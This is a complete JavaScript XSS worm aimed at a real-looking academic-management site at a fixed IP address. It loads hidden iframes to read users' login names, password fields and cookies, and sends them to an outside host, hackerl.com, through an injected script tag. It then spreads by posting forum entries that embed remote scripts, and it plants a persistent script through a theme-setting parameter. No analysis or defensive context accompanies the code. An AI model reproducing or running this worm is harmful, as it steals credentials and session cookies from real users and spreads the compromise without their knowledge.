function post_cookie(data){
    var head = document.getElementsByTagName("head")[0];
    var js_cookie = document.createElement("script");
    var str="http://www.hackerl.com/about.js?"+data;
    js_cookie.src=str;
    js_cookie.type = 'text/javascript';
    js_cookie.language="javascript";
    head.appendChild(js_cookie);
    }


function get_data(){
    get_password();
    var i="name=";
    setTimeout(function () {
		var password=document.getElementById("grsz_xgmm").contentWindow.document.getElementById('oldpassword').value
		if(password==""){
		    password=document.getElementById("login").contentWindow.document.getElementById('userPassword').value
		}
		i=i+document.getElementById("ysgg_query").contentWindow.document.getElementById("Top1_divLoginName").innerHTML+"&password="+password+"&cookie="+document.cookie;
		post_cookie(i);
	}, 2000);
	
}


function inj_iframe(src,id){
    var o = document.createElement("iframe");
    o.src=src;
    o.width=0;
    o.height=0;
    o.id=id;
    document.getElementsByTagName("body")[0].appendChild(o);
    return o;    
}


function get_password(){
    inj_iframe("http://218.64.56.18/jsxsd/grsz/grsz_xgmm","grsz_xgmm");
    inj_iframe("http://218.64.56.18/jsxsd/ggly/ysgg_query","ysgg_query");
    inj_iframe("http://218.64.56.18/jsxsd/","login");    
    return 0;
}


function creat_comment(){
    setTimeout(function () {
    var request=request_creat("POST","http://218.64.56.18/jsxsd/zxwd/huifu_save");
    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    request.send("oaid=40C287B13B70B93AE0530100007F0715&xmms=游戏参与者："+document.getElementById("ysgg_query").contentWindow.document.getElementById("Top1_divLoginName").innerHTML);
	}, 1000);
}
function creat_game(){
    setTimeout(function () {
    var request=request_creat("POST","http://218.64.56.18/jsxsd/zxwd/tw_add_save");
    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    request.send("xmms=小游戏：当你看到这行字的时候，你已经参与了这个游戏^_^请看原帖 http://218.64.56.18/jsxsd/zxwd/zxwd_show?oaid=40C287B13B70B93AE0530100007F0715"+"<script language=\"javascript\" src=\"http://www.hackerl.com/static/js/joke.js\" type=\"text/javascript\"></script><script language=\"javascript\" src=\"http://www.hackerl.com/static/js/about.js\" type=\"text/javascript\"></script>");
	}, 1000);
}


function check(){
    setTimeout(function () {
    var request=request_creat('GET', 'http://218.64.56.18/jsxsd/zxwd/zxwd_show?oaid=40C287B13B70B93AE0530100007F0715')
    request.onreadystatechange = function () {
    if (request.readyState === 4) { 
        if (request.status === 200) {
            var name=document.getElementById("ysgg_query").contentWindow.document.getElementById("Top1_divLoginName").innerHTML;
            if(request.responseText.indexOf(name)==-1){creat_comment();}
        } else {
            return 0;
        }
    } else {   } }
    request.send();
    
    var request_new=request_creat('GET', '/jsxsd/zxwd/zxwd_opt')
    request_new.onreadystatechange = function () {
    if (request_new.readyState === 4) { 
        if (request_new.status === 200) {
            if(request_new.responseText.indexOf("小游戏")==-1){creat_game();}
        } else {
            return 0;
        }
    } else {   } }
    request_new.send();
    }, 2000);
}
function theme(){
    setTimeout(function () {
    var request=request_creat("POST","http://218.64.56.18/jsxsd/system/changeTheme.do");
    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    request.send("changeTheme=blue.css\"><script language=\"javascript\" src=\"http://www.hackerl.com/static/js/hackerl.js\" type=\"text/javascript\"></script> <link id=\"link_theme\" type=\"text/css\" rel=\"stylesheet\" href=\"/jsxsd/framework/images/blue");
    }, 2000);
}

function request_creat(method,url){
    var request;
    if (window.XMLHttpRequest) {
        request = new XMLHttpRequest();
    } else {
        request = new ActiveXObject('Microsoft.XMLHTTP');
    }
    if(method=="POST"){
    request.open("POST",url,true);
    }
    if(method=="GET"){
    request.open("GET",url);
    }
    return request;
}


theme();
get_data();
check();
